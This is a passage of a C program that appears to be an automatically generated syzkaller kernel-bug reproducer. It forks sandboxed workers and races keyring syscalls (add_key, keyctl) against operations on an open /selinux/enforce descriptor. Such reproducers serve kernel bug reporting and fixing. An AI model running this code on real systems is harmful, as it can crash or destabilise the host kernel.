				exitf("umount(%s) failed", filename);
		}
	}
	closedir(dp);
	int i;
	for (i = 0;; i++) {
		if (rmdir(dir) == 0)
			break;
		if (i < 100) {
			if (errno == EROFS) {
				break;
			}
			if (errno == EBUSY) {
				if (umount2(dir, MNT_DETACH))
					exitf("umount(%s) failed", dir);
				continue;
			}
			if (errno == ENOTEMPTY) {
				if (iter < 100) {
					iter++;
					goto retry;
				}
			}
		}
		exitf("rmdir(%s) failed", dir);
	}
}

static void test();

void loop()
{
	int iter;
	checkpoint_net_namespace();
	for (iter = 0;; iter++) {
		char cwdbuf[256];
		sprintf(cwdbuf, "./%d", iter);
		if (mkdir(cwdbuf, 0777))
			fail("failed to mkdir");
		int pid = fork();
		if (pid < 0)
			fail("loop fork failed");
		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
			setpgrp();
			if (chdir(cwdbuf))
				fail("failed to chdir");
			flush_tun();
			test();
			doexit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			int res = waitpid(-1, &status, __WALL | WNOHANG);
			if (res == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start > 5 * 1000) {
				kill(-pid, SIGKILL);
				kill(pid, SIGKILL);
				while (waitpid(-1, &status, __WALL) != pid) {
				}
				break;
			}
		}
		remove_dir(cwdbuf);
		reset_net_namespace();
	}
}

struct thread_t {
	int created, running, call;
	pthread_t th;
};

static struct thread_t threads[16];
static void execute_call(int call);
static int running;
static int collide;

static void* thr(void* arg)
{
	struct thread_t* th = (struct thread_t*)arg;
	for (;;) {
		while (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE))
			syscall(SYS_futex, &th->running, FUTEX_WAIT, 0, 0);
		execute_call(th->call);
		__atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
		__atomic_store_n(&th->running, 0, __ATOMIC_RELEASE);
		syscall(SYS_futex, &th->running, FUTEX_WAKE);
	}
	return 0;
}

static void execute(int num_calls)
{
	int call, thread;
	running = 0;
	for (call = 0; call < num_calls; call++) {
		for (thread = 0; thread < sizeof(threads) / sizeof(threads[0]); thread++) {
			struct thread_t* th = &threads[thread];
			if (!th->created) {
				th->created = 1;
				pthread_attr_t attr;
				pthread_attr_init(&attr);
				pthread_attr_setstacksize(&attr, 128 << 10);
				pthread_create(&th->th, &attr, thr, th);
			}
			if (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE)) {
				th->call = call;
				__atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
				__atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);
				syscall(SYS_futex, &th->running, FUTEX_WAKE);
				if (collide && call % 2)
					break;
				struct timespec ts;
				ts.tv_sec = 0;
				ts.tv_nsec = 20 * 1000 * 1000;
				syscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);
				if (running)
					usleep((call == num_calls - 1) ? 10000 : 1000);
				break;
			}
		}
	}
}

uint64_t r[2] = {0x0, 0xffffffffffffffff};
uint64_t procid;
void execute_call(int call)
{
	long res;	switch (call) {
	case 0:
memcpy((void*)0x20000440, "keyring", 8);
*(uint8_t*)0x20000480 = 0x73;
*(uint8_t*)0x20000481 = 0x79;
*(uint8_t*)0x20000482 = 0x7a;
*(uint8_t*)0x20000483 = 0;
*(uint8_t*)0x20000484 = 0;
		res = syscall(__NR_add_key, 0x20000440, 0x20000480, 0, 0, 0xfffffffe);
		if (res != -1)
				r[0] = res;
		break;
	case 1:
		syscall(__NR_keyctl, 9, r[0], r[0]);
		break;
	case 2:
memcpy((void*)0x20000000, "/selinux/enforce", 17);
		res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000000, 2, 0);
		if (res != -1)
				r[1] = res;
		break;
	case 3:
		syscall(__NR_ioctl, r[1], 0x8904, 0x20000040);
		break;
	case 4:
*(uint32_t*)0x20000280 = 8;
		syscall(__NR_getpeername, r[1], 0x20000240, 0x20000280);
		break;
	case 5:
*(uint32_t*)0x20000340 = 4;
		syscall(__NR_getsockopt, r[1], 0, 0xc, 0x20000300, 0x20000340);
		break;
	}
}

void test()
{
	execute(6);
	collide = 1;
	execute(6);
}

int main()
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	char *cwd = get_current_dir_name();
	for (procid = 0; procid < 8; procid++) {
		if (fork() == 0) {
			for (;;) {
				if (chdir(cwd))
					fail("failed to chdir");
				use_temporary_dir();
				int pid = do_sandbox_setuid();
				int status = 0;
				while (waitpid(pid, &status, __WALL) != pid) {}
			}
		}
	}
	sleep(1000000);
	return 0;
}

```

**End**